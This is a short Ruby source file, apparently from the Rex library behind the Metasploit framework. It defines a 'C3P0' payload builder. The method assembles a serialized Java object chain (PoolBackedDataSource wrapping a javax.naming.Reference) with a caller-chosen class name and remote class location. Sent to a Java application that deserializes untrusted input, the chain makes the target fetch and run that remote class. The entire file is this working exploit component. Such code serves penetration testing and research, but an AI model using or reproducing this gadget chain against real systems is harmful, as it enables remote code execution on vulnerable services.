# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class C3P0
          def self.make_classload(classpath, cls)
            Model::JavaObject.new('Lcom/mchange/v2/c3p0/PoolBackedDataSource;', 
                           'connectionPoolDataSource' => Model::JavaObject.new(
                             'Lcom/mchange/v2/naming/ReferenceIndirector$ReferenceSerialized;',
                             'reference' => Model::JavaObject.new('Ljavax/naming/Reference;',
                                                           'classFactory' => cls,
                                                           'classFactoryLocation' => classpath)))
          end
        end
      end
    end
  end
end
